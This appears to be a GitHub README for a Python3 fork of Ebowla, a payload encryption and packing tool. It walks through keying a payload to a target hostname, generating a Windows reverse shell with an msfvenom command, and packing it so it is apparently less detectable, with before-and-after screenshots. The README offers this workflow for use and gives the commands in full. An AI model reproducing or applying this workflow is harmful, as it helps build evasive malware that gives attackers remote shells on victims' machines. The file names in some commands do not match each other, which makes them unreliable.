# 3 B O W L A
## Ebowla Fork to add Python3 Support
### we are in the very beginning here - so not everything works.

When using go as payload type, most of the functionality should be implemeted and function properly. We decided against rewriting the functionality needed to use python as payload type, as cross compiling python executables on linux only really works through the usage of pyinstaller in wine - which is quite a hassle and an ugly solution, especially considering that GO as payload type can almost take over everything that python could and we, ourselves, never had to use python for it. 

## How to use Ebowla

This part is taken from a writeup I did for Ebowla with python2. With the added python3 support, none of the steps following change, at least not for the output type EXE. If we have time, we will provide documentation adjusted to python3 and other functionality. 

### edit generic.config:

change:

payload_type = GO

output_type = EXE

Set at least one environment variable (computername = hostname),
the name has to be exact, as Ebowla won't decrypt otherwise.

### creating payload

Here used as an example, a reverse shell made with mfsvenom:

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```

### building executable with Ebowla

```python3 ebowla.py shell.exe genetic.config```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-42.png?token=ANDZTD52FKYQIOMKV3RBKUC56NLDI)

```./build_x64_go.sh output/<outputfilefromfirststeps> <finalfilename>```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-47.png?token=ANDZTDZ4WQD7BAUW45VQUWK56NLHO)

The finished, packed executable can be found in the **output** folder.

### Results!

### without Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-50.png?token=ANDZTD3RLAGGH5XC3FN3A2S56NLMI)

### same executable with the use of Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-52.png?token=ANDZTD3BMQF7CAHDMEHEVZC56NLMQ)
